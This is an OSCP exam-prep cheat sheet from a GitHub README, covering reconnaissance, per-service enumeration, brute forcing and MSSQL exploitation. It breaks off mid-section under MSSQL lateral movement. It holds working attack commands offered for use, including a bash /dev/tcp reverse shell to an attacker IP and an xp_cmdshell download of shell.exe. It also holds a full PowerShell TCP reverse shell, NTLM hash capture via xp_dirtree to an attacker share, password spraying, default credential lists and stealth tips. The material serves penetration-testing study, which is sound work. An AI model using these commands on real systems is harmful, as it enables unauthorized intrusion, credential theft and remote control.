# OSCP_Cheat_Sheet
<p><h2>This is a collection of tools, commands and quick reference points I've gathered to help pass the OSCP certification</h2></p>

<img width="520" height="600" alt="image" src="https://github.com/user-attachments/assets/3419386e-813b-4697-bd92-36acd8609bea" />

> **Disclaimer:**  
> This cheat sheet is a personal collection of tools and techniques used for educational purposes only.  
> By using this reference, you acknowledge that the content is provided as-is, and **you are solely responsible** for ensuring that any actions taken with this knowledge are **ethical, legal, and in accordance with applicable laws**.  
> **Use at your own risk.**
>
<div style="border: 2px solid #007bff; padding: 15px; background-color: #e7f3fe; color: #0056b3; border-radius: 5px;">
  <h2 style="color: #007bff; font-weight: bold; font-size: 28px;">Note:</h2>
  <p>Before we get into the cheat sheet, these are some quick references for the OSCP exam:</p>
  <ul>
    <li><a href="https://help.offsec.com/hc/en-us/articles/360050299352-Proctoring-Tool-Manual" target="_blank">Proctoring Tool Manual</a></li>
    <li><a href="https://help.offsec.com/hc/en-us/articles/15295546432148-Proctored-Exam-Requirements-FAQ" target="_blank">Proctored Exam Requirements</a></li>
    <li><a href="https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide" target="_blank">OSCP Exam Guide</a></li>
  </ul>
</div>

# **Table of Contents**

1. [Reconaissance](#reconaissance)
   - [NMAP](#nmap)
   - [Rustscan](#rustscan)
   - [Masscan](#masscan)
   - [Powershell](#powershell)
2. [Specific Ports](#specific-ports)
   - [FTP](#ftp)
   - [SSH](#ssh)
   - [Telnet](#telnet)
   - [SMTP](#smtp)
   - [DNS](#dns)
   - [TFTP](#tftp)
   - [Kerberos](#kerberos)
   - [POP3](#pop3)
   - [RPC](#rpc)
   - [MSRPC](#msrpc)
   - [SMB](#smb)
   - [IMAP](#imap)
   - [SNMP](#snmp)
   - [LDAP](#ldap)
   - [MSSQL](#mssql)
   - [MYSQL](#mysql)
   - [MariaDB](#mariadb)
   - [Oracle](#oracle)
   - [NFS](#nfs)
   - [RDP](#rdp)
   - [PostgreSQL](#postgresql)
   - [VNC](#vnc)
   - [WinRM](#winrm)
   - [Redis](#redis)
3. [Web Testing](#web-testing)
   - [Scanners](#scanners)
     - [Nikto](#nikto)
     - [Nuclei](#nuclei)
     - [WPScan](#wpscan)
   - [Curl](#curl)
   - [Directory Discovery](#directory-discovery)
     - [FFUF](#ffuf)
     - [Dirb](#dirb)
     - [Gobuster](#gobuster)
     - [Feroxbuster](#feroxbuster)
     - [Dirsearch](#dirsearch)
     - [WFUZZ](#wfuzz)
     - [Exposed Git](#exposed-git)
     - [Api](#api)
     - [IDOR](#idor)
   - [Wordlists](#wordlists)
     - [Common Wordlists](#common-wordlists)
     - [Cewl](#cewl)
     - [Rules](#rules)
   - [XSS](#xss)
   - [LFI](#lfi)
   - [RFI](#rfi)
   - [Files and Paths for RFI and LFI](#files-and-paths-for-rfi-and-lfi)
   - [Blacklisted Extensions](#blacklisted-extensions)
   - [Bypassing Filters](#bypassing-filters)
   - [Embedding Code](#embedding-code)
3. [SQL Injection](#sql-injection)
   - [Basic Commands](#basic-commands)
     - [Blind](#blind)
     - [Error Based](#error-based)
     - [Union Based](#union-based)
     - [Login Bypass](#login-bypass)
     - [Truncation](#truncation)
4. [SWAKS](#swaks)
5. [Macros](#macros)
   - [LibreOffice](#libreoffice)
   - [Microsoft Word](#microsoft-word)
6. [Msfvenom](#msfvenom)
7. [Brute Forcing](#brute-forcing)
   - [Hydra](#hydra)
   - [John The Ripper](#john-the-ripper)
   - [Hashcat](#hashcat)
8. [Keepass](#keepass)
9. [Common Credentials](#common-credentials)
10. [CrackMapExec](#crackmapexec)
11. [Netexec](#netexec)
    - [Password Spraying](#password-spraying)
    - [Secrets Dump](#secrets-dump)
12. [NTLM relay attack](#ntlm-relay-attack)
13. [Escalation](#escalation)
    - [Windows](#windows)
    - [Linux](#linux)
14. [Active Directory](#active-directory)
    - [Basic Enumeration](#basic-enumeration)
    - [GPO Abuse](#gpo-abuse)
    - [AS-REP Roasting](#as-rep-roasting)
    - [Kerberoasting](#kerberoasting)
    - [Silver Ticket](#silver-ticket)
    - [Golden Ticket](#golden-ticket)
    - [Shadow Copies](#shadow-copies)
    - [Service Binary Hijacking](#service-binary-hijacking)
    - [DLL Hijacking](#dll-hijacking)
    - [DCSync](#dcsync)
15. [Useful Privileges](#useful-privileges)
16. [File Transferring](#file-transferring)
17. [Reverse Shells](#reverse-shells)
18. [Port Forwarding](#port-forwarding)
    - [Chisel](#chisel)
    - [SSH](#ssh)
    - [Ligolo-ng](#ligolo-ng) 
19. [Various Tools](#various-tools)
   


## Reconaissance

---

## NMAP

> **TCP scan**
> ```bash
> sudo nmap -Pn -n <IP Address> -sC -sV -p- --open
> ```
>
> **UDP scan**
>
> ```bash
> sudo nmap -Pn -n <IP Address> -sU --top-ports=100 --reason
> ```

> **SSH Authentication Bypass Detection**
> ```bash
> nmap -p 22 --script=ssh-auth-methods <target_ip>
> ```

> **SSH Brute Force Attack**
> ```bash
> nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>
> ```

> **Shellshock Vulnerability check**
> ```bash
> nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
> ```

> **SNMP Brute**
> ```bash
> sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<community-file> <target-ip>
> ```

> **Kerberos service availability and basic information**
> ```bash
> nmap -p 88 --script kerberos-enum-users <target_ip>
> ```

> **Scan for common Kerberos vulnerabilities**

> ```bash
> nmap -p 88 --script kerberos-brute <target_ip>
> ```

> **Enumerate SPNs**
> ```bash
> nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
> ```

> **SMB**
> ```bash
> nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>
> ```

> **Redis**
> ```bash
> nmap -p 6379 --script "redis-info,redis-rce" <ip>
> ```

---

## Rustscan

> [!Note]
**To install rustscan on kali linux**
  - Download the latest release from [Rustscan](https://github.com/RustScan/RustScan/releases)
  - Run dpkg -i on the file

> **Basic scan for all TCP ports**
> ```bash
> rustscan -a <target-ip> -p 1-65535
> ```

> **In conjuncture with NMAP**
> ```bash
> rustscan -a <target-ip> -p 1-65535 -- -Pn
> ```

> **Vulnerability Detection**
> ```bash
> rustscan -a <target-ip> -p 1-65535 -- -sV --script vuln
> ```

---

## Masscan

> **Scanning top ports**
> ```bash
> masscan <IP Address>/24 --top-ports 100
> ```

> **Modifying the speed**
> ```bash
> masscan <IP Address>/24 -p80 --rate 100000
> ```

---

## Powershell

> **Port scan script**
> ```powershell
> 1..1024 % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null
> ```

---

## Specific Ports

---

## FTP
> Anonymous Authentication and Modes  
>  
> **Common FTP Credentials**  
> - **Username**: `anonymous`
> - **Password**: `anonymous`
>  
> **Switching to Passive Mode**  
> To enable passive mode, use the command:
> 
> ```bash
> passive
> ```
>  
> **Switching to Binary Mode**  
> To switch to binary mode, use the command:
> 
> ```bash
> binary
> ```
>
> **Uploading a file to server**
> ```bash
> put <file-to-upload>
> ```
>
> **Download a file from the server**
> ```bash
> get <file-to-download>
> ```
>

**Common FTP Commands**

| Command | Description                   | Usage                   |
|---------|-------------------------------|-------------------------|
| `lcd`   | Change local directory.        | `lcd /path/to/directory` |
| `cd`    | Change server directory.       | `cd /path/to/directory`  |
| `ls`    | List server directory files.   | `ls`                     |
| `get`   | Download file from server.     | `get filename.txt`       |
| `mget`  | Download multiple files.       | `mget *.txt`             |
| `put`   | Upload file to server.         | `put filename.txt`       |
| `mput`  | Upload multiple files.         | `mput *.txt`             |
| `bin`   | Set binary transfer mode.      | `bin`                    |
| `ascii` | Set ASCII transfer mode.       | `ascii`                  |
| `quit`  | Exit FTP client.               | `quit`                   |

---

## SSH

> **Basic syntax**
> ```bash
> ssh username@<IP Address>
> ```

> **Using id_rsa**
> ```bash
> ssh -i id_rsa username@<IP Address>
> ```

> **Bypass Host key checking**
> ```bash
> ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
> ```

> **Force a different cipher**
> ```bash
> ssh -c aes128-cbc user@target_ip
> ```

> **Force an older SSH version**
> ```bash
> ssh -2 user@target_ip
> ```

> **SSH Reverse Shell with weak Cryptographic Algorithms**
> ```bash
> ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'
> ```
>  - Make sure to have a listener ready

> **Finding SSH Keys**
> ```bash
> find /etc/ssh -name "*.pub"
> find /home/<user>/.ssh -name "id_*"
> ```

> **Creating new key pai**
> ```bash
> ssh-keygen -t rsa
> ```

> **Modify permissions for id_rsa**
> ```bash
> chmod 600 id_rsa
> ```

---

 ## Telnet

> **Basic login**
> ```bash
> telnet <target_ip> 23
> ```

> **With username**
> ```bash
> telnet -l <username> <target_ip>
> ```

---

## SMTP

> **User Enumeration**
> ```bash
> smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP Address>
> ```

> **Connection**
> ```bash
> telnet <IP Address> 25
> ```

**Common SMTP Commands**

| Command   | Description      | Usage                              |
|-----------|------------------|------------------------------------|
| `HELO`    | Identify client  | `HELO client.com`                  |
| `EHLO`    | Extended HELO    | `EHLO client.com`                  |
| `MAIL FROM` | Sender address  | `MAIL FROM:<sender@domain.com>`    |
| `RCPT TO` | Recipient        | `RCPT TO:<recipient@domain.com>`   |
| `DATA`    | Message content  | `DATA`                             |
| `VRFY`    | Verify user      | `VRFY admin`                       |
| `EXPN`    | Expand list      | `EXPN all`                         |
| `RSET`    | Reset            | `RSET`                             |
| `NOOP`    | No operation     | `NOOP`                             |
| `QUIT`    | Close            | `QUIT`                             |

---

## DNS

**Enumeration**

> **Using Dig**
> ```bash
> dig <IP Address>
>```
> **For Reverse DNS**
> ```bash
> dig -X <IP Address>
> ```

> **Using nslookup**
> ```text
> nslookup
> > server <dns_server_ip>
> > set type=any
> > <domain_name>  # Query any records
> ```

> **dnsenum**
> ```bash
> dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o subdomains.txt -f <WORDLIST> <DOMAIN>
> ```
> ```bash
> dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
> ```

> **DNS Zone Transfer**
> ```bash
> dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr
> ```

> **DNS Cache Snooping**
> ```bash
> dnsrecon -t std -d hackviser.com -D /usr/share/dnsrecon/namelist.txt
> ```
> ```bash
> dig @<dns_server_ip> -t A +norecurse <target_domain>
> ```

> **Enumerating with Powershell**
> ```powershell
> Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
> ```

---

## TFTP

### What is TFTP?

TFTP (Trivial File Transfer Protocol) is a simple, lightweight protocol that operates over UDP. Unlike FTP, it does not require authentication or complex commands. TFTP is typically used for transferring small files like configuration files or firmware, often in environments where simplicity and speed are critical.

### TFTP in Pentesting: A Double-Edged Sword

While TFTP is simple, it can be a **double-edged sword** in penetration testing. On one hand, it's a great tool for quickly transferring files in environments with limited resources or restrictions. On the other hand, if misconfigured, TFTP servers can be **exploited by attackers** to exfiltrate data or upload malicious files to a vulnerable server.

#### Common Uses in Pentesting:
- **Exfiltration**: Attackers may use TFTP to transfer sensitive data from compromised systems to an external server.
- **Firmware Upload**: Many IoT and networking devices use TFTP for firmware updates. Vulnerabilities in this process can allow attackers to upload malicious firmware.
- **Simplicity**: The lack of authentication in TFTP makes it an attractive attack vector for pentesters when targeting poorly configured devices.

### Example Usage:

You can use TFTP to download or upload files to/from a server. Here's a basic example to download a file:

```bash
tftp <target_ip>
tftp> get <file_name>
```
```bash
tftp <target_ip>
tftp> put <file_name>
```
> [!Note]
> For more information, reference [Hackvisor TFTP](https://hackviser.com/tactics/pentesting/services/tftp)

---

## Kerberos

**Kerberos Ticket Types**

| Ticket         | Description            | Use Case               |
|----------------|------------------------|------------------------|
| `TGT`          | Ticket Granting Ticket  | Initial authentication |
| `TGS`          | Ticket Granting Service | Service access         |
| `Golden Ticket`| Forged TGT             | Full domain access     |
| `Silver Ticket`| Forged TGS             | Specific service access|

**Useful Tools**

| Tool            | Description            | Use Case               |
|-----------------|------------------------|------------------------|
| [Kerbrute](https://github.com/ropnop/kerbrute/releases)     | Kerberos enumeration    | Username/password spraying |
| [Rubeus](https://github.com/GhostPack/Rubeus)  | Kerberos attack tool    | Windows-based attacks   |
| [Mimikatz](https://github.com/gentilkiwi/mimikatz) | Credential dumper       | Ticket manipulation     |
| `Impacket`      | Python toolkit          | Various Kerberos attacks |
| `hashcat`       | Password cracker        | Ticket cracking         |
| `John the Ripper` | Password cracker      | Hash cracking           |
| [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | AD enumeration          | Domain reconnaissance   |

**Using kinit**
> - Request ticket granting ticket
> ```bash
> kinit username@DOMAIN.COM
> ```
> - With a password
> ```bash
> echo 'password' | kinit username@DOMAIN.COM
> ```
> - Check Tickets
> ```bash
> klist
> ```
> - Destroy Tickets
> ```bash
> kdestroy
> ```

**Connecting using Impacket**
> - Get the ticket
> ```bash
> impacket-getTGT DOMAIN/username:password
> ```
> - Use the ticket
> ```bash
> export KRB5CCNAME=username.ccache
> ```
> - Request Service Ticket
> ```bash
> impacket-getST -spn service/hostname DOMAIN/username -k -no-pass

**Using Kerbrute**
> - Username Enumeration
>```bash
> ./kerbrute userenum -d [ DC-IP ] usernames.txt
>```
> - Password Spray
> ```bash
> ./kerbrute passwordspray -d [ DC-IP ] domain_users.txt <password>
> ```
> - Brute User
> ```bash
> bruteuser -d [ DC-IP ] passwords.lst [ target-username ]
> ```

>[!Note]
> - For more detailed guide of [Kerbrute](https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/)
> - For more detailed guide of [Rubeus](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)

---

## POP3

**Common POP3 Commands**

| Command | Description            | Usage                   |
|---------|------------------------|-------------------------|
| `USER`  | Username               | `USER username`         |
| `PASS`  | Password               | `PASS password`         |
| `STAT`  | Mailbox stats          | `STAT`                  |
| `LIST`  | List messages          | `LIST`                  |
| `RETR`  | Retrieve message       | `RETR 1`                |
| `DELE`  | Mark for deletion      | `DELE 1`                |
| `NOOP`  | No operation           | `NOOP`                  |
| `RSET`  | Reset                  | `RSET`                  |
| `TOP`   | Message header + lines | `TOP 1 10`              |
| `UIDL`  | Unique IDs             | `UIDL`                  |
| `QUIT`  | Close connection       | `QUIT`                  |

**Connecting to POP3**
 - Telnet
> ```bash
> telnet <IP Address> 110
> ```
 - OpenSSL for POP3S
> ```bash
> openssl s_client -connect <IP Address>:995 -crlf -quiet
> ```
 - Curl
> - Reading Emails
> ```bash
> curl -u username:password pop3://<IP Address>/
> ```
> - Read specific email
> ```bash
> curl -u username:password pop3://<IP Address>/1
> ```
> - POP3s
> ```bash
> curl -u username:password pop3s://<IP Address>/ --insecure
> ```

---

## RPC

**Connecting**
>```bash
> nc -z -v -u <IP Address> 111

**Recon**
>```bash
>rpcinfo -p <IP Address>
>```

**Enumeration**
>```bash
>rpcenum -v <IP Address>
>```

**Create an RPC bridge**
>```bash
>rpcclient -U "username%password" <IP Address>
>```

---

## MSRPC

**Enumeration using impacket**
> ```bash
> impacket-rpcdump <IP Address> -p 135
> ```

**Using Rpcclient**

**Rpcclient Commands**

| Command              | Description                     |
|----------------------|---------------------------------|
| `enumdomusers`        | Enumerates domain users         |
| `enumdomgroups`       | Enumerates domain groups        |
| `queryuser 0x450`     | Queries a user by SID           |
| `enumprinters`        | Enumerates printers             |
| `querydominfo`        | Queries domain information      |
| `createdomuser`       | Creates a new domain user       |
| `deletedomuser`       | Deletes a domain user           |
| `lookupnames`         | Looks up names from SID         |
| `lookupsids`          | Looks up SID from names         |
| `lsaaddacctrights`    | Adds account rights             |
| `lsaremoveacctrights` | Removes account rights          |
| `dsroledominfo`       | Displays domain role information|
| `dsenumdomtrusts`     | Enumerates domain trusts        |

> - Connect with a null session
> ```bash
> rpcclient -U "" -N <IP Address>
> ```

> - Connect to the target and list available shares
> ```bash
> rpcclient -U "" -N <IP Address> -c "srvinfo"
> ```

> - List all available users
> ```bash
> rpcclient -U "" -N <IP Address> -c "enumdomusers"
> ```

> - Enumerate domain groups
> ```bash
> rpcclient -U "" -N <IP Address> -c "enumdomgroups"
> ```

> - Query user information
> ```bash
> rpcclient -U "<username>" -W "<domain>" <IP Address> -c "queryuser <username>"
> ```

---

## SMB

**Enumeration**
- smbmap
> ```bash
> smbmap -H <IP Address>
> ```
> ```bash
> smbmap -u '' -p '' -H <IP Address>

- smbclient
> - List shares without a password
> ```bash
> smbclient -N -L //<IP Address>
> ```
> - Connecting with username and password
> ```bash
> smbclient -U '<username>' -P '<password>' //<IP Address>
> ```
> - Downloading files from login (Make sure to change timeout for larger files)
> ```bash
> smbclient //<IP Address>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *"
> ```

- Enum4Linux
> - Basic Enumeration
> ```bash
> enum4linux -a <IP Address>
> ```
> - Extract Domain Users
> ```bash
> enum4linux -U <DOMAIN_IP>
> ```
> - Extract all Domain Shares
> ```bash
> enum4linux -S <IP Address>
> enum4linux -a -M -l -d <IP Address> 2>&1
> ```

-Mounting SMB Shares
> ```bash
> mkdir /tmp/share
> sudo mount -t cifs //<IP Address>/<SHARE> /tmp/share
> or
> sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP Address>/<SHARE> /tmp/share

---

## IMAP

**Common Commands**

| Command   | Description        | Usage                        |
|-----------|--------------------|------------------------------|
| `CAPABILITY` | List capabilities  | `a1 CAPABILITY`              |
| `LOGIN`       | Authenticate       | `a1 LOGIN user pass`         |
| `LIST`        | List mailboxes     | `a1 LIST "" "*"`             |
| `SELECT`      | Select mailbox     | `a1 SELECT INBOX`            |
| `FETCH`       | Retrieve messages  | `a1 FETCH 1 BODY[]`          |
| `SEARCH`      | Search messages    | `a1 SEARCH TEXT "keyword"`   |
| `STORE`       | Modify flags       | `a1 STORE 1 +FLAGS \Deleted` |
| `LOGOUT`      | Close session      | `a1 LOGOUT`                  |

**Connecting**
> ```bash
> telnet <IP Address> 143
> ```

**Read all Emails**
> ```text
> a1 LOGIN username password
>a2 SELECT INBOX
>a3 FETCH 1:* (BODY[])
> ```

**Searching for Specific content**
> ```text
> a4 SEARCH SUBJECT "password"
> a5 SEARCH FROM "admin@target.com"
> a6 SEARCH TEXT "confidential"
> ```

**Keyword Search**
>```text
> SEARCH TEXT "password"
> SEARCH TEXT "credential"
> SEARCH TEXT "confidential"
> SEARCH SUBJECT "reset"
> ```

---

## SNMP

**Basic Enumeration**
- #### Versions = 1, 2c, 3
> ```bash
> snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <IP Address>
> ```

**Using hydra to discover the community string**
> ```bash
> hydra -P /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt snmp://<IP Address>
> ```

**Using snmpwalk to discover passwords**
> ```bash
> snmpwalk -v 2c -c security <IP Address> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
> ```

---

## LDAP

**ldapsearch basic enumeration**

### Basic LDAP query
> ```bash
> ldapsearch -x -H ldap://<target_ip>
> ```
### Basic LDAP Search for a base-level
> ```bash
> ldapsearch -h <target_ip> -x -s base
> ```
### Get Naming Contexts
> ```bash
> ldapsearch -x -H ldap://<target_ip> -s base namingcontexts
> ```
### Search in a Specific Base Domain Name
> ```bash
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"
> ```
### Enumerate users using LDAP
>```bash
> ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"
> ```
### Retrieve users Account Name
> ```bash
> ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:
> ```
### Search with Filters
> ```bash
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
> ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"
> ```
### Searching with authentication
> ```bash
> ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"
> ```
### Searching terms
> ```bash
> ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"
> ```
### Specifies the value term to return
> ```bash
> ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>

**Useful Search Terms**

| **Description**                                                                 | **Search Term**                                                                          |
| ------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **Search for ms-MCS-AdmPwd (local administrator passwords)**                    | `(ms-MCS-AdmPwd=*)`                                                                      |
| **Search for attributes containing 'password' in description**                  | `(description=*password*)`                                                               |
| **Search for LAPS expiration time (to identify potential password management)** | `(ms-MCS-AdmPwdExpirationTime=*)`                                                        |
| **Search for common weak passwords in attributes like description**             | `(description=*(123456*|password*|qwerty*|letmein*))` |
| **Search for All Users**                                                        | `(objectClass=user)`                                                                     |
| **Search for All Computers**                                                    | `(objectClass=computer)`                                                                 |
| **Search for All Groups**                                                       | `(objectClass=group)`                                                                    |
| **Search for Disabled Accounts**                                                | `(userAccountControl:1.2.840.113556.1.4.803:=2)`                                         |
| **Search for Expired Accounts**                                                 | `(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))` |
| **Search for Specific Group Membership**                                        | `(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))`                |
| **For users with a specific email domain**                                      | `(mail=*@example.com)`                                                                   |
| **For users with a specific title**                                             | `(title=Manager)`                                                                        |
| **Search for Password Last Set**                                                | `(pwdLastSet=*)`                                                                         |
| **Search for Accounts with Expired Passwords**                                  | `(& (objectClass=user)(pwdLastSet<=0))`                                                  |
| **Search for Accounts in a Specific Organizational Unit (OU)**                  | `(distinguishedName=*,OU=Sales,DC=domain,DC=com)`                                        |
| **Search for Accounts with Kerberos Pre-Authentication Disabled**               | `(userAccountControl:1.2.840.113556.1.4.803:=4194304)`                                   |
| **Search for Service Principal Names (SPNs)**                                   | `(servicePrincipalName=*)`                                                               |
| **Search for Delegated Users**                                                  | `(msDS-AllowedToDelegateTo=*)`                                                           |
| **Search for Accounts with Privileges**                                         | `(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)`                                  |
| **Search for All Organizational Units**                                         | `(objectClass=organizationalUnit)`                                                       |
| **Search for Active Directory Certificate Services**                            | `(objectClass=cACertificate)`                                                            |
| **Search for All Attributes of a Specific User**                                | `(sAMAccountName=username)`                                                              |
| **Search for Accounts with Specific Notes or Descriptions**                     | `(description=*keyword*)`                                                                |
| **Search for all objects in the directory**                                     | `(objectClass=*)`                                                                        |
| **Search for service accounts**                                                 | `(objectCategory=serviceAccount)`                                                        |
| **Search for accounts with specific group memberships (replace 'GroupName')**   | `(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)`                                     |
| **Search for computer accounts**                                                | `(objectClass=computer)`                                                                 |
| **Search for users in a specific organizational unit (replace 'OU=Users')**     | `(ou=OU=Users,DC=domain,DC=com)`                                                         |
| **Search for all accounts with specific attributes**                            | `(pwdLastSet=0)`                                                                         |

---

## MSSQL

**Common Procedures**

| Procedure                | Description                       | Requires Admin |
|--------------------------|-----------------------------------|----------------|
| xp_cmdshell              | Execute OS commands               | Yes            |
| sp_configure             | Configure server options          | Yes            |
| xp_dirtree               | List directory contents           | No             |
| xp_fileexist             | Check file existence              | No             |
| xp_subdirs               | List subdirectories               | No             |
| sp_linkedservers         | List linked servers               | No             |
| sp_addlinkedsrvlogin     | Add linked server login           | Yes            |
| OPENROWSET               | Query remote data source          | Varies         |
| BULK INSERT              | Import data from file            | Varies         |

**Default Credentials**
> - Common default credentials
> ```text
> sa:<blank>
> sa:sa
> sa:password
> sa:Password123
> sa:P@ssw0rd
> ```
**Connecting**
### Using impacket
> - Windows authentication
> ```bash
> impacket-mssqlclient DOMAIN/username:password@<IP Address>
> ```
> - SQL authentication
> ```bash
> impacket-mssqlclient sa:password@<IP Address>.com -windows-auth
> ```
> - With specific database
> ```bash
> impacket-mssqlclient username:password@<IP Address> -db master
> ```
> - Using hash (Pass-the-Hash)
> ```bash
> impacket-mssqlclient.py username@<IP Address> -hashes :NTHASH
> ```
### Using sqsh
> - Connect with SQL authentication
> ```bash
> sqsh -S <IP Address> -U sa -P password
> ```
> - Connect with Windows authentication
> ```bash
> sqsh -S <IP Address> -U DOMAIN\\username -P password
> ```

**Enumeration**
### Version Detection
> - Get SQL Server version
> ```sql
> SELECT @@version;
> ```
> - Get product version
> ```sql
> SELECT SERVERPROPERTY('ProductVersion');
> SELECT SERVERPROPERTY('ProductLevel');
> SELECT SERVERPROPERTY('Edition');
> ```
> - Get machine name
> ```sql
> SELECT @@SERVERNAME;
> SELECT SERVERPROPERTY('MachineName');
> ```
### Database Enumeration
> - List all databases
> ```sql
> SELECT name FROM sys.databases;
> SELECT name FROM master.dbo.sysdatabases;
> ```
> - Current database
> ```sql
> SELECT DB_NAME();
> ```
> - Database information
> ```sql
> SELECT name, database_id, create_date
> FROM sys.databases;
> ```
> - Database size
> ```sql
> EXEC sp_helpdb;
> ```
- User Enumeration
> - List all users
> ```sql
> SELECT name FROM master.sys.server_principals;
> SELECT name FROM sys.sysusers;
>```
> - Current user
> ```sql
> SELECT USER_NAME();
> SELECT SYSTEM_USER;
> SELECT CURRENT_USER;
> ```
> - User privileges
> ```sql
> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
> ```
> - List sysadmin users
> ```sql
> SELECT name FROM master.sys.server_principals 
> WHERE IS_SRVROLEMEMBER('sysadmin', name) = 1;
> ```
### Table and Column Enumeration
> - List tables in current database
> ```sql
> SELECT table_name FROM information_schema.tables;
> ```
> - List all columns in a table
> ```sql
> SELECT column_name, data_type 
> FROM information_schema.columns 
> WHERE table_name = 'users';
> ```
> - Search for specific column names
> ```sql
> SELECT table_name, column_name 
> FROM information_schema.columns 
> WHERE column_name LIKE '%password%';
> ```
> - Count rows in tables
> ```sql
> SELECT t.name, p.rows 
> FROM sys.tables t
> INNER JOIN sys.partitions p ON t.object_id = p.object_id
> WHERE p.index_id < 2;
> ```
### Privilege Enumeration
> - Check if current user is sysadmin
> ```sql
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
> - Check server roles
> ```sql
> SELECT name FROM master.sys.server_principals 
> WHERE type = 'R';
> ```
> - Current user permissions
> ```sql
> EXEC sp_helprotect;
> ```
> - Database role members
> ```sql
> EXEC sp_helprolemember;
> ```
### xp_cmdshell
> - Enabling
> ```sql
> EXEC sp_configure 'show advanced options', 1;
> RECONFIGURE;
> EXEC sp_configure 'xp_cmdshell', 1;
> RECONFIGURE;
> ```
### Use and persistence
> ```sql
> EXEC xp_cmdshell 'whoami';
> ```
> - Disable xp_cmdshell (for stealth)
> ```sql
> EXEC sp_configure 'xp_cmdshell', 0;
> RECONFIGURE;
> ```
> - Read file
> ```sql
> EXEC xp_cmdshell 'type C:\Windows\win.ini';
> ```
> - Write file
> ```sql
> EXEC xp_cmdshell 'echo test > C:\Temp\test.txt';
> ```
> - Copy file
> ```sql
> EXEC xp_cmdshell 'copy C:\source.txt C:\dest.txt';
> ```
> - Download file
> ```sql
> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker IP>/shell.exe -OutFile C:\Temp\shell.exe"';
> ```
### Capturing hashes
> - Start Responder on attacker machine
> ```bash
> sudo responder -I eth0
> ```
> - On MSSQL
> ```sql
> EXEC xp_dirtree '\\<attacker IP>\share';
> EXEC xp_fileexist '\\<attacker IP>\share\file';
> ```
> - Or using xp_subdirs
> ```sql
> EXEC master..xp_subdirs '\\attacker-ip\share';
> ```
> - Or Extract password hashes once logged in (requires sysadmin)
> ```sql
> SELECT name, password_hash FROM sys.sql_logins;
> ```
> - Crack the hash
> ```bash
> hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
> ```
### Impersonation Attacks
> - Check for impersonation permissions
> ```sql
> SELECT distinct b.name
> FROM sys.server_permissions a
> INNER JOIN sys.server_principals b
> ON a.grantor_principal_id = b.principal_id
> WHERE a.permission_name = 'IMPERSONATE';
> ```
> - Impersonate sysadmin user
> ```sql
> EXECUTE AS LOGIN = 'sa';
> SELECT SYSTEM_USER;
> SELECT IS_SRVROLEMEMBER('sysadmin');
> ```
> - Execute as different user
> ```sql
> EXECUTE AS USER = 'admin_user';
> ```
> - Revert to original context
> ```sql
> REVERT;
> ```
- Reverse Shell
> ```sql
> EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''attacker-ip'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
> ```
### Lateral Movement
> - Domain Enumeration
> - Enumerate domain users
> ```sql
